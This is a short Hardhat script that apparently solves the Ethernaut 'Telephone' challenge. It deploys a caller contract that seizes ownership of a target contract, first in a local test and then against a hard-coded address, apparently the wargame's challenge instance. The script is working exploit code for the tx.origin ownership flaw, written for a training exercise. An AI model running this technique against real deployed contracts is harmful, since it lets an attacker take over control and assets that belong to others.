import { ethers } from "hardhat";

// Run on localhost
async function handleTest() {
  const telephoneFactory = await ethers.getContractFactory("Telephone");
  const telephone = await telephoneFactory.deploy();

  const telephoneCallerFactory = await ethers.getContractFactory(
    "TelephoneCaller"
  );
  const telephoneCaller = await telephoneCallerFactory.deploy(
    await telephone.getAddress()
  );

  await telephoneCaller.callChangeOwner();
}

async function handleReal() {
  const telephoneCallerFactory = await ethers.getContractFactory(
    "TelephoneCaller"
  );
  const telephoneCaller = await telephoneCallerFactory.deploy(
    "0x59929b8581bd0055ac41CF345eADA62208a55043"
  );

  await telephoneCaller.callChangeOwner();
}

// handleTest().catch((error) => {
handleReal().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
